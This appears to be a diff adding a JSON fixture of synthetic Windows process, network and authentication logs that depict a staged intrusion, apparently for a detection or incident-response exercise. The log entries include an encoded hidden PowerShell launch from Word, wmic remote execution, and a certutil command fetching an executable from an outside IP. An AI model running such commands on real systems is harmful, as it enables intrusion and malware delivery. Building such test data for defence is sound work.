@@ -1,0 +1,163 @@
+{
+  "process_logs": [
+    {
+      "timestamp": "2026-05-06T09:01:00",
+      "host": "WKSTN-01",
+      "user": "alice",
+      "process": "powershell.exe",
+      "parent": "winword.exe",
+      "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+      "pid": 4812,
+      "ppid": 3200
+    },
+    {
+      "timestamp": "2026-05-06T09:01:05",
+      "host": "WKSTN-01",
+      "user": "alice",
+      "process": "cmd.exe",
+      "parent": "powershell.exe",
+      "cmdline": "cmd.exe /c whoami && net user /domain",
+      "pid": 5100,
+      "ppid": 4812
+    },
+    {
+      "timestamp": "2026-05-06T09:05:00",
+      "host": "DC-01",
+      "user": "svc_backup",
+      "process": "wmic.exe",
+      "parent": "cmd.exe",
+      "cmdline": "wmic /node:10.0.1.5 process call create \"cmd.exe\"",
+      "pid": 2210,
+      "ppid": 2100
+    },
+    {
+      "timestamp": "2026-05-06T09:10:00",
+      "host": "WKSTN-03",
+      "user": "bob",
+      "process": "svchost.exe",
+      "parent": "explorer.exe",
+      "cmdline": "C:\\Users\\bob\\AppData\\Local\\Temp\\svchost.exe",
+      "pid": 6600,
+      "ppid": 1200
+    },
+    {
+      "timestamp": "2026-05-06T09:15:00",
+      "host": "WKSTN-01",
+      "user": "alice",
+      "process": "certutil.exe",
+      "parent": "cmd.exe",
+      "cmdline": "certutil.exe -urlcache -split -f http://185.220.101.47/tool.exe C:\\Temp\\t.exe",
+      "pid": 5500,
+      "ppid": 5100
+    },
+    {
+      "timestamp": "2026-05-06T10:00:00",
+      "host": "FILESERVER-01",
+      "user": "john",
+      "process": "explorer.exe",
+      "parent": "userinit.exe",
+      "cmdline": "C:\\Windows\\explorer.exe",
+      "pid": 1900,
+      "ppid": 1800
+    }
+  ],
+  "network_logs": [
+    {
+      "timestamp": "2026-05-06T09:01:05",
+      "src_ip": "10.0.1.5",
+      "dst_ip": "185.220.101.47",
+      "dst_port": 4444,
+      "protocol": "TCP",
+      "bytes": 512000,
+      "process": "powershell.exe",
+      "host": "WKSTN-01"
+    },
+    {
+      "timestamp": "2026-05-06T09:02:00",
+      "src_ip": "10.0.1.5",
+      "dst_ip": "185.220.101.47",
+      "dst_port": 443,
+      "protocol": "TCP",
+      "bytes": 8500000,
+      "process": "powershell.exe",
+      "host": "WKSTN-01"
+    },
+    {
+      "timestamp": "2026-05-06T09:05:00",
+      "src_ip": "10.0.0.50",
+      "dst_ip": "8.8.4.4",
+      "dst_port": 53,
+      "protocol": "UDP",
+      "bytes": 9000,
+      "process": "dns.exe",
+      "host": "DC-01"
+    },
+    {
+      "timestamp": "2026-05-06T09:15:00",
+      "src_ip": "10.0.1.5",
+      "dst_ip": "185.220.101.47",
+      "dst_port": 80,
+      "protocol": "TCP",
+      "bytes": 245760,
+      "process": "certutil.exe",
+      "host": "WKSTN-01"
+    },
+    {
+      "timestamp": "2026-05-06T10:00:00",
+      "src_ip": "10.0.1.8",
+      "dst_ip": "10.0.1.5",
+      "dst_port": 445,
+      "protocol": "TCP",
+      "bytes": 1200,
+      "process": "smb",
+      "host": "WKSTN-04"
+    }
+  ],
+  "auth_logs": [
+    {
+      "timestamp": "2026-05-06T09:00:05",
+      "host": "DC-01",
+      "user": "alice",
+      "src_ip": "10.0.1.5",
+      "event": "logon_success",
+      "logon_type": 3,
+      "auth_pkg": "NTLM"
+    },
+    {
+      "timestamp": "2026-05-06T09:00:10",
+      "host": "FILESERVER-01",
+      "user": "alice",
+      "src_ip": "10.0.1.5",
+      "event": "logon_success",
+      "logon_type": 3,
+      "auth_pkg": "NTLM"
+    },
+    {
+      "timestamp": "2026-05-06T09:00:15",
+      "host": "WKSTN-10",
+      "user": "alice",
+      "src_ip": "10.0.1.5",
+      "event": "logon_success",
+      "logon_type": 3,
+      "auth_pkg": "NTLM"
+    },
+    {
+      "timestamp": "2026-05-06T09:00:20",
+      "host": "WKSTN-11",
+      "user": "alice",
+      "src_ip": "10.0.1.5",
+      "event": "logon_success",
+      "logon_type": 3,
+      "auth_pkg": "NTLM"
+    },
+    {
+      "timestamp": "2026-05-06T09:00:25",
+      "host": "WKSTN-12",
+      "user": "alice",
+      "src_ip": "10.0.1.5",
+      "event": "logon_success",
+      "logon_type": 3,
+      "auth_pkg": "NTLM"
+    }
+  ]
+}
